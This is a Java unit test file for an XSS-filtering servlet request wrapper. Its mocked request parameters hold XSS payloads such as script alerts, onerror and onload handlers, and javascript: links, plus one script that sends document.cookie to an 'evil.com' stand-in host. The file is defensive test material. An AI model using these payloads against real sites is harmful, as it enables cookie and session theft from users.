package plus.ruoyi.common.web.filter;

import jakarta.servlet.ServletInputStream;
import jakarta.servlet.http.HttpServletRequest;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import plus.ruoyi.common.test.base.BaseUnitTest;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.*;

/**
 * XssHttpServletRequestWrapper XSS过滤请求包装器测试
 * <p>
 * 测试请求包装器的核心功能:
 * <ul>
 *   <li>getParameter - 单个参数XSS过滤</li>
 *   <li>getParameterValues - 参数数组XSS过滤</li>
 *   <li>getParameterMap - 参数Map XSS过滤</li>
 *   <li>getInputStream - JSON请求体XSS过滤</li>
 *   <li>isJsonRequest - JSON请求判断</li>
 * </ul>
 *
 * @author 抓蛙师
 */
@DisplayName("XssHttpServletRequestWrapper XSS过滤请求包装器测试")
class XssHttpServletRequestWrapperTest extends BaseUnitTest {

    // ==================== getParameter 测试 ====================

    @Nested
    @DisplayName("getParameter 单个参数过滤测试")
    class GetParameterTests {

        @Test
        @DisplayName("普通文本 - 应原样返回")
        void testNormalText() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameter("name")).thenReturn("张三");

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            assertEquals("张三", wrapper.getParameter("name"), "普通文本应原样返回");
        }

        @Test
        @DisplayName("null值 - 应返回null")
        void testNullValue() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameter("name")).thenReturn(null);

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            assertNull(wrapper.getParameter("name"), "null值应返回null");
        }

        @Test
        @DisplayName("包含script标签 - 应清除")
        void testScriptTag() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameter("content")).thenReturn("<script>alert('xss')</script>正常内容");

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            String result = wrapper.getParameter("content");
            assertFalse(result.contains("<script>"), "应清除script标签");
            assertFalse(result.contains("</script>"), "应清除script结束标签");
            assertTrue(result.contains("正常内容"), "正常内容应保留");
        }

        @Test
        @DisplayName("包含HTML标签 - 应清除")
        void testHtmlTags() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameter("content")).thenReturn("<div><p>测试</p></div>");

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            String result = wrapper.getParameter("content");
            assertFalse(result.contains("<div>"), "应清除div标签");
            assertFalse(result.contains("<p>"), "应清除p标签");
            assertTrue(result.contains("测试"), "文本内容应保留");
        }

        @Test
        @DisplayName("包含事件属性 - 应清除")
        void testEventAttributes() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameter("content")).thenReturn("<img src='x' onerror='alert(1)'>图片");

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            String result = wrapper.getParameter("content");
            assertFalse(result.contains("onerror"), "应清除onerror属性");
            assertTrue(result.contains("图片"), "正常文本应保留");
        }

        @Test
        @DisplayName("前后空格 - 应去除")
        void testTrimSpaces() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameter("name")).thenReturn("  张三  ");

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            assertEquals("张三", wrapper.getParameter("name"), "前后空格应去除");
        }

        @Test
        @DisplayName("包含iframe标签 - 应清除")
        void testIframeTag() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameter("content")).thenReturn("<iframe src='evil.com'></iframe>内容");

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            String result = wrapper.getParameter("content");
            assertFalse(result.contains("<iframe"), "应清除iframe标签");
            assertTrue(result.contains("内容"), "正常内容应保留");
        }
    }

    // ==================== getParameterValues 测试 ====================

    @Nested
    @DisplayName("getParameterValues 参数数组过滤测试")
    class GetParameterValuesTests {

        @Test
        @DisplayName("普通数组 - 应原样返回")
        void testNormalArray() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameterValues("ids")).thenReturn(new String[]{"1", "2", "3"});

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            String[] result = wrapper.getParameterValues("ids");
            assertArrayEquals(new String[]{"1", "2", "3"}, result, "普通数组应原样返回");
        }

        @Test
        @DisplayName("null数组 - 应返回null")
        void testNullArray() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameterValues("ids")).thenReturn(null);

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            assertNull(wrapper.getParameterValues("ids"), "null数组应返回null");
        }

        @Test
        @DisplayName("空数组 - 应返回空数组")
        void testEmptyArray() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameterValues("ids")).thenReturn(new String[]{});

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            String[] result = wrapper.getParameterValues("ids");
            assertNotNull(result, "空数组不应为null");
            assertEquals(0, result.length, "空数组长度应为0");
        }

        @Test
        @DisplayName("数组中包含XSS - 应逐个过滤")
        void testArrayWithXss() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameterValues("names")).thenReturn(new String[]{
                "<script>alert(1)</script>张三",
                "<div>李四</div>",
                "王五"
            });

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            String[] result = wrapper.getParameterValues("names");
            assertEquals(3, result.length, "数组长度应保持不变");
            assertFalse(result[0].contains("<script>"), "第一个元素应过滤XSS");
            assertTrue(result[0].contains("张三"), "第一个元素应保留正常内容");
            assertFalse(result[1].contains("<div>"), "第二个元素应过滤HTML");
            assertTrue(result[1].contains("李四"), "第二个元素应保留正常内容");
            assertEquals("王五", result[2], "第三个元素应原样返回");
        }
    }

    // ==================== getParameterMap 测试 ====================

    @Nested
    @DisplayName("getParameterMap 参数Map过滤测试")
    class GetParameterMapTests {

        @Test
        @DisplayName("空Map - 应返回空Map")
        void testEmptyMap() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameterMap()).thenReturn(new HashMap<>());

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            Map<String, String[]> result = wrapper.getParameterMap();
            assertNotNull(result, "空Map不应为null");
            assertTrue(result.isEmpty(), "空Map应为空");
        }

        @Test
        @DisplayName("普通Map - 应原样返回")
        void testNormalMap() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            Map<String, String[]> paramMap = new HashMap<>();
            paramMap.put("name", new String[]{"张三"});
            paramMap.put("age", new String[]{"18"});
            when(mockRequest.getParameterMap()).thenReturn(paramMap);

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            Map<String, String[]> result = wrapper.getParameterMap();
            assertEquals(2, result.size(), "Map大小应不变");
            assertArrayEquals(new String[]{"张三"}, result.get("name"), "name参数应正确");
            assertArrayEquals(new String[]{"18"}, result.get("age"), "age参数应正确");
        }

        @Test
        @DisplayName("Map中包含XSS - 应过滤所有值")
        void testMapWithXss() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            Map<String, String[]> paramMap = new HashMap<>();
            paramMap.put("content", new String[]{"<script>alert(1)</script>内容"});
            paramMap.put("title", new String[]{"<b>标题</b>"});
            when(mockRequest.getParameterMap()).thenReturn(paramMap);

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            Map<String, String[]> result = wrapper.getParameterMap();
            assertFalse(result.get("content")[0].contains("<script>"), "content应过滤XSS");
            assertTrue(result.get("content")[0].contains("内容"), "content应保留正常内容");
            assertFalse(result.get("title")[0].contains("<b>"), "title应过滤HTML");
            assertTrue(result.get("title")[0].contains("标题"), "title应保留正常内容");
        }
    }

    // ==================== isJsonRequest 测试 ====================

    @Nested
    @DisplayName("isJsonRequest JSON请求判断测试")
    class IsJsonRequestTests {

        @Test
        @DisplayName("application/json - 应返回true")
        void testApplicationJson() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getHeader(HttpHeaders.CONTENT_TYPE)).thenReturn(MediaType.APPLICATION_JSON_VALUE);

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            assertTrue(wrapper.isJsonRequest(), "application/json应识别为JSON请求");
        }

        @Test
        @DisplayName("application/json;charset=UTF-8 - 应返回true")
        void testApplicationJsonWithCharset() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getHeader(HttpHeaders.CONTENT_TYPE)).thenReturn("application/json;charset=UTF-8");

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            assertTrue(wrapper.isJsonRequest(), "application/json;charset=UTF-8应识别为JSON请求");
        }

        @Test
        @DisplayName("text/html - 应返回false")
        void testTextHtml() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getHeader(HttpHeaders.CONTENT_TYPE)).thenReturn(MediaType.TEXT_HTML_VALUE);

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            assertFalse(wrapper.isJsonRequest(), "text/html应识别为非JSON请求");
        }

        @Test
        @DisplayName("multipart/form-data - 应返回false")
        void testMultipartFormData() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getHeader(HttpHeaders.CONTENT_TYPE)).thenReturn(MediaType.MULTIPART_FORM_DATA_VALUE);

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            assertFalse(wrapper.isJsonRequest(), "multipart/form-data应识别为非JSON请求");
        }

        @Test
        @DisplayName("null Content-Type - 应返回false")
        void testNullContentType() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getHeader(HttpHeaders.CONTENT_TYPE)).thenReturn(null);

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            assertFalse(wrapper.isJsonRequest(), "null Content-Type应识别为非JSON请求");
        }

        @Test
        @DisplayName("APPLICATION/JSON (大写) - 应返回true")
        void testApplicationJsonUpperCase() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getHeader(HttpHeaders.CONTENT_TYPE)).thenReturn("APPLICATION/JSON");

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            assertTrue(wrapper.isJsonRequest(), "APPLICATION/JSON (大写) 应识别为JSON请求");
        }
    }

    // ==================== getInputStream 测试 ====================

    @Nested
    @DisplayName("getInputStream JSON请求体过滤测试")
    class GetInputStreamTests {

        @Test
        @DisplayName("非JSON请求 - 应返回原始输入流")
        void testNonJsonRequest() throws IOException {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getHeader(HttpHeaders.CONTENT_TYPE)).thenReturn(MediaType.TEXT_HTML_VALUE);

            ServletInputStream mockInputStream = mock(ServletInputStream.class);
            when(mockRequest.getInputStream()).thenReturn(mockInputStream);

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            // 非JSON请求应返回原始输入流
            ServletInputStream result = wrapper.getInputStream();
            assertSame(mockInputStream, result, "非JSON请求应返回原始输入流");
        }

        @Test
        @DisplayName("JSON请求包含XSS - 应过滤")
        void testJsonRequestWithXss() throws IOException {
            String xssJson = "{\"name\":\"<script>alert(1)</script>张三\"}";

            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getHeader(HttpHeaders.CONTENT_TYPE)).thenReturn(MediaType.APPLICATION_JSON_VALUE);

            // 创建模拟的ServletInputStream
            ByteArrayInputStream byteStream = new ByteArrayInputStream(xssJson.getBytes(StandardCharsets.UTF_8));
            ServletInputStream mockInputStream = new ServletInputStream() {
                @Override
                public boolean isFinished() {
                    return byteStream.available() == 0;
                }

                @Override
                public boolean isReady() {
                    return true;
                }

                @Override
                public void setReadListener(jakarta.servlet.ReadListener readListener) {
                }

                @Override
                public int read() throws IOException {
                    return byteStream.read();
                }
            };
            when(mockRequest.getInputStream()).thenReturn(mockInputStream);

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            ServletInputStream result = wrapper.getInputStream();

            // 读取过滤后的内容
            byte[] buffer = new byte[1024];
            int len = result.read(buffer);
            String filteredJson = new String(buffer, 0, len, StandardCharsets.UTF_8);

            assertFalse(filteredJson.contains("<script>"), "JSON请求体应过滤XSS");
            assertTrue(filteredJson.contains("张三"), "JSON请求体应保留正常内容");
        }

        @Test
        @DisplayName("空JSON请求体 - 应返回原始输入流")
        void testEmptyJsonRequest() throws IOException {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getHeader(HttpHeaders.CONTENT_TYPE)).thenReturn(MediaType.APPLICATION_JSON_VALUE);

            ByteArrayInputStream byteStream = new ByteArrayInputStream(new byte[0]);
            ServletInputStream mockInputStream = new ServletInputStream() {
                @Override
                public boolean isFinished() {
                    return true;
                }

                @Override
                public boolean isReady() {
                    return true;
                }

                @Override
                public void setReadListener(jakarta.servlet.ReadListener readListener) {
                }

                @Override
                public int read() throws IOException {
                    return byteStream.read();
                }
            };
            when(mockRequest.getInputStream()).thenReturn(mockInputStream);

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            ServletInputStream result = wrapper.getInputStream();
            assertNotNull(result, "空JSON请求体不应返回null");
        }
    }

    // ==================== XSS攻击场景测试 ====================

    @Nested
    @DisplayName("XSS攻击场景测试")
    class XssAttackScenarioTests {

        @Test
        @DisplayName("反射型XSS - script标签")
        void testReflectedXssScript() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameter("q")).thenReturn("<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>");

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            String result = wrapper.getParameter("q");
            // HtmlUtil.cleanHtmlTag 只移除标签，文本内容会保留
            assertFalse(result.contains("<script"), "应过滤script开始标签");
            assertFalse(result.contains("</script>"), "应过滤script结束标签");
        }

        @Test
        @DisplayName("存储型XSS - 事件处理器")
        void testStoredXssEventHandler() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameter("comment")).thenReturn("<img src=x onerror=alert('XSS')>");

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            String result = wrapper.getParameter("comment");
            assertFalse(result.contains("onerror"), "应过滤onerror事件");
        }

        @Test
        @DisplayName("DOM型XSS - javascript协议")
        void testDomXssJavascriptProtocol() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameter("url")).thenReturn("<a href='javascript:alert(1)'>点击</a>");

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            String result = wrapper.getParameter("url");
            assertFalse(result.contains("javascript:"), "应过滤javascript协议");
        }

        @Test
        @DisplayName("SVG XSS攻击")
        void testSvgXss() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            when(mockRequest.getParameter("content")).thenReturn("<svg onload=alert(1)>");

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            String result = wrapper.getParameter("content");
            assertFalse(result.contains("<svg"), "应过滤svg标签");
        }

        @Test
        @DisplayName("HTML实体编码绕过")
        void testHtmlEntityBypass() {
            HttpServletRequest mockRequest = mock(HttpServletRequest.class);
            // 已编码的XSS，HtmlUtil.cleanHtmlTag应该可以处理
            when(mockRequest.getParameter("content")).thenReturn("<div>&#60;script&#62;alert(1)&#60;/script&#62;</div>");

            XssHttpServletRequestWrapper wrapper = new XssHttpServletRequestWrapper(mockRequest);

            String result = wrapper.getParameter("content");
            // 外层div标签应被清除
            assertFalse(result.contains("<div>"), "应过滤div标签");
        }
    }
}
